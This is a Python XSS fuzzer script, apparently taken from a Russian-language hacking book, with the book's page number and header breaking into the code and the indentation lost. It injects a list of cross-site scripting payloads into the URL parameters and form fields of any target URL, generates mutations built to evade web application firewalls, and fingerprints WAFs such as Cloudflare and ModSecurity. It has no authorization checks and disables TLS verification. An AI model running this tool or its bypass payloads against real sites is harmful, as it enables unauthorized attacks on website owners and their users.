#!/usr/bin/env python3
import requests
import re
import argparse
import html
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BASE_PAYLOADS = [
'<script>alert("XSS")</script>',
'<img src=x onerror=alert("XSS")>',
'<svg onload=alert("XSS")>',
'<body onload=alert("XSS")>',
'"><script>alert("XSS")</script>',
"'><script>alert('XSS')</script>",
'<iframe src="javascript:alert(`XSS`)">',
'<input autofocus onfocus=alert("XSS")>',
'<details open ontoggle=alert("XSS")>',
'<video><source onerror="alert(\'XSS\')">',
]
def mutate_payloads(payloads: list[str]) -> list[str]:
"""Генерирует мутации payload'ов для обхода фильтров."""
mutated = list(payloads)
for p in payloads:
# 1. Смена регистра тегов: <ScRiPt>
mutated.append(p.replace("<script>", "<ScRiPt>").replace("</script>",
"</ScRiPt>"))
# 2. HTML entities: < → &#60; или &lt;
mutated.append(p.replace("<", "&#60;").replace(">", "&#62;"))
# 3. Двойное URL-кодирование: % → %25
encoded = p.replace("<", "%3c").replace(">", "%3e")
mutated.append(encoded)
— 66 —
# 4. Нулевые байты между символами
mutated.append(p.replace("script", "scr\x00ipt"))
30 Python-скриптов для Хакинга
# 5. Добавление HTML-комментария внутри тега (обход WAF regex)
mutated.append(p.replace("<script>", "<sc<!--comment-->ript>"))
# 6. Tab вместо пробела в атрибутах
mutated.append(p.replace(" onload=", "\tonload=")
.replace(" onerror=", "\tonerror="))
# 7. Использование обратного слеша
mutated.append(p.replace("'", "\\'").replace('"', '\\"'))
# 8. Unicode escape: alert → \u0061lert
if "alert" in p:
mutated.append(p.replace("alert", "\\u0061lert"))
# 9. String.fromCharCode
if "alert" in p:
mutated.append(p.replace('alert("XSS")',
'String.fromCharCode(97,108,101,114,116)(1)'))
return list(set(mutated)) # Убираем дубликаты
def get_forms(url: str, session: requests.Session) -> list[dict]:
"""Извлекает все формы со страницы."""
try:
resp = session.get(url, timeout=10, verify=False)
soup = BeautifulSoup(resp.text, "html.parser")
forms = []
for form in soup.find_all("form"):
action = form.get("action", "")
method = form.get("method", "get").upper()
inputs = {}
for inp in form.find_all(["input", "textarea", "select"]):
name = inp.get("name")
if name:
inp_type = inp.get("type", "text")
# Пропускаем submit/button/hidden для тестирования
if inp_type not in ("submit", "button", "image"):
inputs[name] = inp.get("value", "test")
forms.append({
"action": action,
"method": method,
"inputs": inputs
})
return forms
except Exception:
return []
def detect_waf(response: requests.Response) -> str | None:
"""Определяет WAF по заголовкам и содержимому ответа."""
headers_str = str(response.headers).lower()
body_lower = response.text.lower()
waf_signatures = {
"Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
"AWS WAF": ["x-amzn-requestid", "awswaf"],
"ModSecurity": ["mod_security", "modsecurity"],
"Incapsula": ["x-iinfo", "incapsula"],
"Akamai":
 ["akamaighost", "x-akamai"],
"F5 BigIP": ["bigip", "f5_cspm"],
}
for waf, sigs in waf_signatures.items():
if any(s in headers_str or s in body_lower for s in sigs):
return waf
return None
def test_xss_in_url_param(url: str, param: str, payloads: list[str],
session: requests.Session) -> list[dict]:
"""Тестирует XSS в URL параметре."""
findings = []
parsed = urlparse(url)
params = parse_qs(parsed.query, keep_blank_values=True)
params = {k: v[0] for k, v in params.items()}
for payload in payloads:
test_params = params.copy()
test_params[param] = payload
query = urlencode(test_params)
test_url = urlunparse(parsed._replace(query=query))
try:
resp = session.get(test_url, timeout=5, verify=False)
# Проверяем отражение payload'а в ответе
if payload in resp.text or html.unescape(payload) in resp.text:
print(f" {GREEN}[REFLECTED] Параметр '{param}' отражает
payload!{RESET}")
print(f" Payload: {payload[:80]}")
findings.append({"type": "reflected", "param": param,
"payload": payload, "url": test_url})
break # Нашли - достаточно для этого параметра
except Exception:
continue
return findings
def test_xss_in_form(base_url: str, form: dict, payloads: list[str],
session: requests.Session) -> list[dict]:
"""Тестирует XSS во всех полях формы."""
findings = []
action_url = form["action"] or base_url
if not action_url.startswith("http"):
parsed = urlparse(base_url)
action_url = f"{parsed.scheme}://{parsed.netloc}{action_url}"
for input_name in form["inputs"]:
for payload in payloads[:20]: # Первые 20 для скорости
test_data = form["inputs"].copy()
test_data[input_name] = payload
try:
if form["method"] == "POST":
resp = session.post(action_url, data=test_data,
timeout=5, verify=False)
else:
resp = session.get(action_url, params=test_data,
timeout=5, verify=False)
if payload in resp.text:
print(f" {GREEN}[REFLECTED] Форма | Поле '{input_name}' "
f"отражает payload!{RESET}")
print(f" Payload: {payload[:80]}")
findings.append({
"type": "form_reflected",
"form": action_url,
"field": input_name,
"payload": payload
})
break
except Exception:
continue
return findings
def main():
parser = argparse.ArgumentParser(description="XSS Fuzzer with WAF bypass
mutations")
parser.add_argument("-u", "--url",
 required=True, help="Целевой URL")
parser.add_argument("-m", "--method", default="GET", choices=["GET",
"POST"])
parser.add_argument("--no-mutate",
 action="store_true",
help="Не генерировать мутации payloads")
parser.add_argument("--threads",
 type=int, default=5)
args = parser.parse_args()
session = requests.Session()
session.headers.update({
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
"Accept": "*/*",
})
print(f"{CYAN}[*] XSS Fuzzer → {args.url}{RESET}")
print("-" * 60)
# Базовая проверка на WAF
try:
resp = session.get(args.url, timeout=5, verify=False)
waf = detect_waf(resp)
if waf:
print(f"{YELLOW}[!] WAF обнаружен: {waf}{RESET}")
print(f"{YELLOW}[!] Включаем расширенные мутации...{RESET}")
else:
print(f"{GREEN}[*] WAF не обнаружен{RESET}")
except Exception:
pass
# Генерируем payloads
payloads = BASE_PAYLOADS.copy()
if not args.no_mutate:
payloads = mutate_payloads(payloads)
print(f"{CYAN}[*] Загружено payloads: {len(payloads)} (включая
мутации){RESET}\n")
all_findings = []
# Тест URL параметров
parsed = urlparse(args.url)
url_params = parse_qs(parsed.query)
if url_params:
print(f"{YELLOW}[*] Тестируем URL параметры:
{list(url_params.keys())}{RESET}")
for param in url_params:
findings = test_xss_in_url_param(args.url, param, payloads, session)
all_findings += findings
# Тест форм
print(f"\n{YELLOW}[*] Сканируем формы на странице...{RESET}")
forms = get_forms(args.url, session)
if forms:
print(f"{CYAN}[*] Найдено форм: {len(forms)}{RESET}")
for i, form in enumerate(forms, 1):
print(f"\n Форма #{i}: {form['method']} → {form['action'] or args.url}")
print(f" Поля: {list(form['inputs'].keys())}")
findings = test_xss_in_form(args.url, form, payloads, session)
all_findings += findings
else:
print(f"{RED}[-] Форм не найдено{RESET}")
# Итог
print(f"\n{'='*60}")
if all_findings:
print(f"{GREEN}[✓] Найдено {len(all_findings)} потенциальных XSS!{RESET}")
for f in all_findings:
print(f" {GREEN}→ {f['type']} | {f.get('param', f.get('field',
'unknown'))}{RESET}")
else:
print(f"{RED}[-] XSS не обнаружена{RESET}")
if __name__ == "__main__":
main()
